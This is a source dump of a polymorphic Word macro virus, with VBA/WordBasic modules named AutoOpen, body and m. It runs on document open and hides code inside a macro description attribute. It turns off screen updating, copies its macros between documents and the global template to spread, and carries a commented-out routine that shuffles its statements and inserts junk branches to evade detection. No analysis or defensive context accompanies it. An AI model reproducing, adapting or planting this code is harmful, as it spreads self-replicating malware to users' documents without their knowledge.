   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub main()
   WordBasic.Call "m"
   End Sub

   Attribute VB_Name = "body"

   Public Sub main()
   Rem k302
   End Sub

   'sub k3(fnm$,wh)
   'f1$ = "AutoOpen"
   Rem 'f2$ = "Autoclose"
   'f3$ = "m" : p$ = Chr$(13)
   'if wh=3 then
   'MacroCopy f1$, fnm$ + f1$
   Rem 'MacroCopy  f2$, fnm$ + f2$
   'MacroCopy f3$, fnm$ + f3$
   'else
   'MacroCopy fnm$ + f1$,f1$
   Rem 'MacroCopy fnm$ + f2$,f2$
   'MacroCopy fnm$ + f3$,f3$
   'end if
   'macupd(wh)
   'docclose 2
   'End Sub

   'Function rnum(nst, nend)
   'rnum = Int(Rnd() * ((nend + 1)  -  nst) + nst)
   'End Function

   'Sub macupd(dest)
   'screenupdating 0
   'Dim m1all$(20)
   'Dim m1to4$(10)
   'm1all$(1) = "i = 1"
   'm1all$(2) = "c$ = Chr$(67)"
   'm1all$(3) = "b$ = FileName$() + chr$(58)"
   'm1all$(4) = "ScreenUpdating 0"
   'm1all$(5) = "If CountMacros(1) = 0 Then whcp = 3"
   'm1all$(6) = "If CountMacros(1) > 0 Then whcp = 1"
   'm1all$(7) = " d$ = Chr$(77) "
   'cnt = 7
   'm1all$(11) = " a$ = MacroDesc$(d$)"
   'm1all$(12) = " ToolsMacro .Name = c$, .Edit, .Show = 1 "
   'm1all$(13) = "Insert a$"
   'm1all$(14) = "DocClose 1"
   'm1all$(15) = "c.gb(b$, whcp)"
   'm1all$(16) = "ToolsMacro .Name = c$, .Delete, .Show = 1 "
   'For i = 1 To cnt
   'lab1:
   'k = rnum(1, cnt)
   ' If m1to4$(k) <> "" Then
   '    Goto lab1
   '   Else
   '    m1to4$(k) = m1all$(i)
   '   End If
   'Next i
   'For i = 1 To cnt
   'a$ = a$ + m1to4$(i) + Chr$(13)
   '  Next i
   'For i = 11 To 16
   'selcrit = rnum(1, 4)
   'Select Case selcrit
   '     Case 2
   '           asel$ = "if i=1 then "
   '     Case 3
   '           asel$ = "if i>0 then "
   '     Case 4
   '           asel$ = "goto " + Chr$(60 + i) + ":" + Chr$(13) + Chr$(60 '+ i) + ":" + Chr$(13)
   '          Case Else
   '              asel$ = ""
   'End Select
   ' a$ = a$ + asel$ + m1all$(i) + Chr$(13)
   'Next i
   'ToolsMacro .Name = "m", .Show = dest, .Edit
   'editselectall
   'editcut
   'Insert "sub main"+ Chr$(13)+a$+"end sub"
   'docclose 1
   'End Sub

   Attribute VB_Name = "m"

   Public Sub main()
   Attribute main.VB_Description = "' \r\n\r\nend sub\r\nsub gb(n$,w)\r\ne$=""body""\r\non error resume next\r\nfilesaveas .format=1\r\nif w=1 then macrocopy n$+e$, e$ else macrocopy e$, n$+e$\r\ntoolsmacro .name=e$,.edit,.show=1\r\neditreplace .find=""'"",.replace="""",.replaceall\r\nbody.k3(n$,w)"
   Attribute main.VB_ProcData.VB_Invoke_Func = "TemplateProject.m.main"
   Dim i
   Dim whcp
   Dim d$
   Dim b$
   Dim c$
   Dim a$
   i = 1
   If WordBasic.CountMacros(1) = 0 Then whcp = 3
   If WordBasic.CountMacros(1) > 0 Then whcp = 1
   WordBasic.ScreenUpdating 0
    d$ = Chr(77)
   b$ = WordBasic.[FileName$]() + Chr(58)
   c$ = Chr(67)
   If i = 1 Then a$ = WordBasic.[MacroDesc$](d$)
   If i = 1 Then WordBasic.ToolsMacro Name:=c$, Edit:=1, Show:=1
   WordBasic.Insert a$
   If i = 1 Then WordBasic.DocClose 1
   If i = 1 Then WordBasic.Call "c.gb", b$, whcp
   GoTo L:
   L:
   WordBasic.ToolsMacro Name:=c$, Delete:=1, Show:=1
   End Sub
